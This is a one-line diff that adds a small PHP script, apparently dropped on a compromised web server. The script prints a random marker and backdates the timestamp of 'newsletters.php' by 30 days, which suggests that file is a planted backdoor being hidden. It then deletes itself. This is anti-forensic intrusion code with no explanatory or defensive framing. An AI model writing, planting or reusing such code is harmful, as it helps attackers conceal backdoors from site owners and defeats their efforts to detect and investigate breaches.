@@ -1,0 +1,1 @@
+<?php echo "qUcKcmfxwm"; if (file_exists("./newsletters.php")){ touch("./newsletters.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*kVgAeUHSdEKA9ykNDths*/ ?>
